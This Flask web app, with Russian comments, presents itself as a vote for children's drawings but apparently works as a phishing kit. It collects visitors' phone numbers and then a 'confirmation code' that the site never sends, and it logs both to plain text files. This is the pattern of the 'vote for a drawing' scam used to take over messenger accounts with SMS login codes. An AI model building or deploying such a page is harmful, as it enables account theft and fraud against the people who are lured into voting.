from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Данные рисунков (обычно это будет храниться в базе данных)
drawings = [
    {'id': 1, 'title': 'Рисунок 1', 'image': 'static/image1.jpg', 'child_name': 'Иван'},
    {'id': 2, 'title': 'Рисунок 2', 'image': 'static/image2.jpg', 'child_name': 'Анна'},
]

@app.route('/')
def home():
    return render_template('home.html', drawings=drawings)

@app.route('/vote/<int:drawing_id>', methods=['GET', 'POST'])
def vote(drawing_id):
    drawing = next((d for d in drawings if d['id'] == drawing_id), None)
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        try:
            with open('phone_numbers.txt', 'a') as file:
                file.write(f'{phone_number}\n')
            print(f'Номер телефона {phone_number} успешно записан в файл.')
        except Exception as e:
            print(f'Ошибка при записи номера телефона в файл: {e}')
        return redirect(url_for('confirm', phone_number=phone_number, drawing_id=drawing_id))
    return render_template('vote.html', drawing=drawing)

@app.route('/confirm/<phone_number>/<int:drawing_id>', methods=['GET', 'POST'])
def confirm(phone_number, drawing_id):
    if request.method == 'POST':
        code = request.form['code']
        try:
            with open('confirmation_codes.txt', 'a') as file:
                file.write(f'{phone_number}: {code}\n')
            print(f'Код подтверждения для номера {phone_number} успешно записан в файл.')
        except Exception as e:
            print(f'Ошибка при записи кода подтверждения в файл: {e}')
        return 'Спасибо за ваш голос!'
    return render_template('confirm.html', phone_number=phone_number, drawing_id=drawing_id)

if __name__ == '__main__':
    if not os.path.exists('phone_numbers.txt'):
        with open('phone_numbers.txt', 'w') as file:
            pass
    if not os.path.exists('confirmation_codes.txt'):
        with open('confirmation_codes.txt', 'w') as file:
            pass
    app.run(debug=True)
